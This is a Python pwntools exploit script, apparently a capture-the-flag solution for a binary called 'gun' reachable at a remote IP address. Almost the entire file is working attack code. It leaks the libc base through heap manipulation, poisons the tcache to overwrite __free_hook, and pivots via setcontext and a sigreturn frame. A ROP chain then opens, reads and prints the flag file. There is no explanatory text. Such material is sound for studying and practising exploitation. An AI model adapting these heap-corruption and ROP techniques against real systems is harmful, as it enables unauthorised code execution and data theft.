import os
from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch='amd64'

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0').encode())
            if not os.access('./Pwn', os.F_OK): os.mkdir('./Pwn')
            path = './Pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)
io=remote('123.57.209.176',30772)
#io=process('./gun')
libc=ELF('./libc-2.31.so')
elf=change_ld('./gun','./ld-2.31.so')

#io=elf.process(env={'LD_PRELOAD':'./libc-2.31.so'})




def add(size,data):
    io.recvuntil('Action> ')
    io.sendline('3')
    io.recvuntil('price: ')
    io.sendline(str(size))
    io.recvuntil('Name: ')
    io.sendline(data)

def free(times):
    io.recvuntil('Action> ')
    io.sendline('1')
    io.recvuntil('Shoot time: ')
    io.sendline(str(times))

def load(idx):
    io.recvuntil('Action> ')
    io.sendline('2')
    io.recvuntil('load?')
    io.sendline(str(idx))


io.recvuntil('Your name: ')
io.sendline('ydh')


[add(0x80,'a') for i in range(9)]
[load(i) for i in range(8)]
free(10)
#[add(0x100,'a') for i in range(9)]
add(0x68,'aaaaaaaa')

load(0)
free(10)
io.recvuntil('The aaaaaaaa')
libc_base=u64(io.recv('6').ljust(8,b'\x00'))-0x1ebc60
free_hook=libc_base+libc.sym['__free_hook']

print(hex(libc_base))


[add(0x68,'a') for i in range(10)]#0~9
[load(i+3) for i in range(8,-1,-1)]
free(10)

load(1)
load(0)
free(10)

load(2)
free(10)

io.recvline()
io.recvuntil('The ')
pl_heap=u64(io.recv('6').ljust(8,b'\x00'))+0x3f0+0x10
print(hex(pl_heap))

[add(0x68,'a') for i in range(7) ]#0~6

add(0x68,p64(free_hook))#7
add(0x68,'a')#8
add(0x68,'b')#9


p=libc_base+0x154930
setcontext=libc_base+0x00580DD

add(0x68,p64(p))#10



frame = SigreturnFrame()
frame.rdi = pl_heap + 0x100 + 0x100
frame.rsi = 0
frame.rdx = 0x100
frame.rsp = pl_heap + 0x100
frame.rip = libc_base + 0x00025679 # : ret
frame.set_regvalue('&fpstate', pl_heap-0x500)
pl = p64(setcontext)+p64(pl_heap-0x20)+bytes(frame)[0x30:]
layout = [libc_base + libc.search(asm("pop rax\nret")).__next__(), #: pop rax; ret; 
2,
# sys_open("./flag", 0)
libc_base + libc.search(asm("syscall\nret")).__next__(), #: syscall; ret; 
libc_base + libc.search(asm("pop rdi\nret")).__next__(), #: pop rdi; ret; 
3, 
libc_base + libc.search(asm("pop rsi\nret")).__next__(), #: pop rsi; ret; 
pl_heap - 0x500,
libc_base +0x162866, #: pop rdx; ret; 
0x100,
1,
libc_base + libc.search(asm("pop rax\nret")).__next__(), #: pop rax; ret; 
0,
# sys_read(flag_fd, heap, 0x100)
libc_base + libc.search(asm("syscall\nret")).__next__(), #: syscall; ret; 

libc_base + libc.search(asm("pop rdi\nret")).__next__(), #: pop rdi; ret; 
1,
libc_base + libc.search(asm("pop rsi\nret")).__next__(), #: pop rsi; ret; 
pl_heap - 0x500,
libc_base + 0x162866, #: pop rdx; ret; 
0x100,
1,
libc_base + libc.search(asm("pop rax\nret")).__next__(), #: pop rax; ret; 
1,
# sys_write(1, heap, 0x100)
libc_base + libc.search(asm("syscall\nret")).__next__(), #: syscall; ret; 
]
pl = pl.ljust(0x100, b'\0') + flat(layout)
pl = pl.ljust(0x200, b'\0') + b'./flag'
		

#free(10)


add(0x210,pl)#11
load(11)
free(1)

#gdb.attach(io)
io.interactive()		


